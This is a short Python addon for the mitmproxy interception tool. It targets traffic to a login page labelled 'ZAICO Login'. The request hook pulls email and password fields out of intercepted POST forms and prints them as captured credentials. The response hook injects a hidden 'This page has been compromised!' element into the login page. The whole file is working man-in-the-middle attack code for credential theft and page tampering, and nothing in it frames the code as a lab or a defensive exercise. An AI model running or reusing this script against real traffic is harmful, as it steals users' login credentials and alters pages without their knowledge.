from mitmproxy import http
import json

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method == "POST":
        try:
            form_data = dict(flow.request.urlencoded_form)
            if "email" in form_data and "password" in form_data:
                print(f"[*] Captured credentials:")
                print(f"Email: {form_data['email']}")
                print(f"Password: {form_data['password']}")
        except:
            pass

def response(flow: http.HTTPFlow) -> None:
    if "text/html" in flow.response.headers.get("content-type", ""):
        html = flow.response.content.decode()
        if "ZAICO Login" in html:
            # Add a hidden message to show the page has been modified
            html = html.replace('</style>', '''
                .hacked-message {
                    display: none;
                }
            </style>
            <div class="hacked-message">This page has been compromised!</div>
            ''')
        flow.response.content = html.encode()
